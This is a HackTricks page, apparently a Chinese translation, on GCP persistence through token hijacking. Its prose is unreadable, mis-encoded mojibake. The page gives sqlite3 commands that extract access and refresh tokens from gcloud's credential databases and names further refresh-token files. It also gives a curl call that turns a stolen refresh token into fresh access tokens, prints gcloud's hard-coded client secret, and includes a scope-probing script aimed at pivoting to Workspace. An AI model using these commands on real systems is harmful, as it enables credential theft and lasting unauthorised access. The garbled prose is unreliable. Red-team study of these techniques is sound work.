# GCP - Non-svc Persistance

{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹  AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹  GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}

è¿™äº›æŠ€æœ¯åœ¨ä½ ä»¥æŸç§æ–¹å¼è·å–äº†ä¸€äº› GCP å‡­è¯æˆ–åœ¨ GCP ç¯å¢ƒä¸­è¿è¡Œçš„æœºå™¨åéå¸¸æœ‰ç”¨ã€‚

## Token Hijacking

### Authenticated User Tokens

è¦è·å–ç”¨æˆ·çš„**å½“å‰ token**ï¼Œä½ å¯ä»¥è¿è¡Œï¼š

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
{% endcode %}

æŸ¥çœ‹æ­¤é¡µé¢äº†è§£å¦‚ä½•**ç›´æ¥ä½¿ç”¨æ­¤ä»¤ç‰Œä½¿ç”¨gcloud**ï¼š

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#id-6440-1" %}

è·å–**ç”Ÿæˆæ–°è®¿é—®ä»¤ç‰Œ**çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·è¿è¡Œï¼š

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
{% endcode %}

ä¹Ÿå¯ä»¥åœ¨ **`$HOME/.config/gcloud/application_default_credentials.json`** å’Œ **`$HOME/.config/gcloud/legacy_credentials/*/adc.json`** ä¸­æ‰¾åˆ° refresh tokensã€‚

ä½¿ç”¨ **refresh token**ã€client ID å’Œ client secret è·å–æ–°çš„åˆ·æ–° access tokenï¼Œè¿è¡Œï¼š

{% code overflow="wrap" %}
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

åˆ·æ–°ä»¤ç‰Œçš„æœ‰æ•ˆæ€§å¯ä»¥åœ¨ **Admin** > **Security** > **Google Cloud session control** ä¸­ç®¡ç†ï¼Œé»˜è®¤è®¾ç½®ä¸º16å°æ—¶ï¼Œå°½ç®¡å¯ä»¥è®¾ç½®ä¸ºæ°¸ä¸è¿‡æœŸï¼š

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Auth flow

ä½¿ç”¨ç±»ä¼¼ `gcloud auth login` çš„èº«ä»½éªŒè¯æµç¨‹ä¼šåœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ä¸€ä¸ªæç¤ºï¼Œæ¥å—æ‰€æœ‰èŒƒå›´åï¼Œæµè§ˆå™¨ä¼šå‘å·¥å…·æ‰“å¼€çš„ http ç«¯å£å‘é€å¦‚ä¸‹è¯·æ±‚ï¼š
```
/?state=EN5AK1GxwrEKgKog9ANBm0qDwWByYO&code=4/0AeaYSHCllDzZCAt2IlNWjMHqr4XKOuNuhOL-TM541gv-F6WOUsbwXiUgMYvo4Fg0NGzV9A&scope=email%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20https://www.googleapis.com/auth/appengine.admin%20https://www.googleapis.com/auth/sqlservice.login%20https://www.googleapis.com/auth/compute%20https://www.googleapis.com/auth/accounts.reauth&authuser=0&prompt=consent HTTP/1.1
```
ç„¶åï¼Œgcloud å°†ä½¿ç”¨çŠ¶æ€å’Œä»£ç ä»¥åŠä¸€äº›ç¡¬ç¼–ç çš„ `client_id` (`32555940559.apps.googleusercontent.com`) å’Œ **`client_secret`** (`ZmssLNjJy2998hD4CTg2ejr2`) æ¥è·å– **æœ€ç»ˆçš„åˆ·æ–°ä»¤ç‰Œæ•°æ®**ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œä¸ localhost çš„é€šä¿¡æ˜¯é€šè¿‡ HTTP è¿›è¡Œçš„ï¼Œå› æ­¤æœ‰å¯èƒ½æ‹¦æˆªæ•°æ®ä»¥è·å–åˆ·æ–°ä»¤ç‰Œï¼Œä½†æ­¤æ•°æ®ä»…æœ‰æ•ˆä¸€æ¬¡ï¼Œæ‰€ä»¥è¿™å°†æ˜¯æ— ç”¨çš„ï¼Œæ›´å®¹æ˜“ç›´æ¥ä»æ–‡ä»¶ä¸­è¯»å–åˆ·æ–°ä»¤ç‰Œã€‚
{% endhint %}

### OAuth èŒƒå›´

ä½ å¯ä»¥åœ¨ [https://developers.google.com/identity/protocols/oauth2/scopes](https://developers.google.com/identity/protocols/oauth2/scopes) æ‰¾åˆ°æ‰€æœ‰ Google èŒƒå›´ï¼Œæˆ–è€…é€šè¿‡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è·å–ï¼š

{% code overflow="wrap" %}
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-A/\-\._]*' | sort -u
```
{% endcode %}

å¯ä»¥ä½¿ç”¨æ­¤è„šæœ¬æŸ¥çœ‹ **`gcloud`** ç”¨äºè®¤è¯çš„åº”ç”¨ç¨‹åºæ”¯æŒå“ªäº›èŒƒå›´ï¼š
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope         \r"
if ! curl -v "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=32555940559.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%3A8085%2F&scope=openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fappengine.admin+$scope+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fsqlservice.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcompute+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Faccounts.reauth&state=AjvFqBW5XNIw3VADagy5pvUSPraLQu&access_type=offline&code_challenge=IOk5F08WLn5xYPGRAHP9CTGHbLFDUElsP551ni2leN4&code_challenge_method=S256" 2>&1 | grep -q "error"; then
echo ""
echo $scope
fi
done
```
æ‰§è¡Œåï¼Œæ£€æŸ¥åˆ°æ­¤åº”ç”¨æ”¯æŒä»¥ä¸‹èŒƒå›´ï¼š
```
https://www.googleapis.com/auth/appengine.admin
https://www.googleapis.com/auth/bigquery
https://www.googleapis.com/auth/cloud-platform
https://www.googleapis.com/auth/compute
https://www.googleapis.com/auth/devstorage.full_control
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/userinfo.email
```
å¾ˆæœ‰è¶£çš„æ˜¯ï¼Œè¿™ä¸ªåº”ç”¨æ”¯æŒ **`drive`** èŒƒå›´ï¼Œè¿™å¯èƒ½å…è®¸ç”¨æˆ·ä» GCP å‡çº§åˆ° Workspaceï¼Œå¦‚æœæ”»å‡»è€…è®¾æ³•å¼ºè¿«ç”¨æˆ·ç”Ÿæˆå…·æœ‰æ­¤èŒƒå›´çš„ä»¤ç‰Œã€‚

**æŸ¥çœ‹å¦‚ä½•** [**æ»¥ç”¨æ­¤åŠŸèƒ½**](../gcp-to-workspace-pivoting/#abusing-gcloud)**.**

### Service Accounts

å°±åƒç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ä¸€æ ·ï¼Œå¦‚æœä½ è®¾æ³•**ç ´è§£æœåŠ¡è´¦æˆ·çš„ç§é’¥æ–‡ä»¶**ï¼Œä½ é€šå¸¸å¯ä»¥**éšæ„è®¿é—®å®ƒ**ã€‚\
ç„¶è€Œï¼Œå¦‚æœä½ çªƒå–äº†æœåŠ¡è´¦æˆ·çš„ **OAuth ä»¤ç‰Œ**ï¼Œè¿™å¯èƒ½æ›´æœ‰è¶£ï¼Œå› ä¸ºå³ä½¿é»˜è®¤æƒ…å†µä¸‹è¿™äº›ä»¤ç‰Œåªæœ‰æ•ˆä¸€ä¸ªå°æ—¶ï¼Œå¦‚æœ**å—å®³è€…åˆ é™¤äº†ç§æœ‰ API å¯†é’¥ï¼ŒOAuth ä»¤ç‰Œä»ç„¶ä¼šåœ¨åˆ°æœŸå‰æœ‰æ•ˆ**ã€‚

### Metadata

æ˜¾ç„¶ï¼Œåªè¦ä½ åœ¨ GCP ç¯å¢ƒä¸­è¿è¡Œçš„æœºå™¨å†…ï¼Œä½ å°±å¯ä»¥**é€šè¿‡è”ç³»å…ƒæ•°æ®ç«¯ç‚¹è®¿é—®é™„åŠ åˆ°è¯¥æœºå™¨çš„æœåŠ¡è´¦æˆ·**ï¼ˆè¯·æ³¨æ„ï¼Œä½ å¯ä»¥åœ¨æ­¤ç«¯ç‚¹è®¿é—®çš„ OAuth ä»¤ç‰Œé€šå¸¸å—èŒƒå›´é™åˆ¶ï¼‰ã€‚

### Remediations

è¿™äº›æŠ€æœ¯çš„ä¸€äº›è¡¥æ•‘æªæ–½åœ¨ [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2) ä¸­æœ‰è§£é‡Šã€‚

## References

* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP Hackingï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}
